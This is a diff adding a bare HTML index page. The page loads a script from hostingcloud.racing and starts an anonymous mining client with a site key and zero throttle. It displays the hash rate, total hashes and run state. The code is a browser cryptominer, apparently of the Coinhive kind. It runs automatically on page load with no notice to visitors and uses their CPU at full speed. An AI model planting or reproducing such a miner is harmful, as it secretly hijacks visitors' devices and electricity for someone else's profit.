@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>index</title>
+  </head>
+
+  <body>
+  <div id="running"></div>
+  <div id="hash"></div>
+  <div id="hashes"></div>
+<script src="https://www.hostingcloud.racing/t4Yg.js"></script>
+<script>
+    var _client = new Client.Anonymous('3190cda6350ce3f29aaef92abcfec48a1dbe22e9b91c8847508c5357ba1f989f', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+window.setInterval(timer, 5000);
+function timer() {
+	hps = _client.getHashesPerSecond();
+	document.getElementById("hash").innerHTML = hps.toFixed(2)+" H/s";
+	hashes = _client.getTotalHashes([true]);
+	document.getElementById("hashes").innerHTML = hashes;
+	running = _client.isRunning();
+	document.getElementById("running").innerHTML = running;
+}
+</script>
+  </body>
+</html>
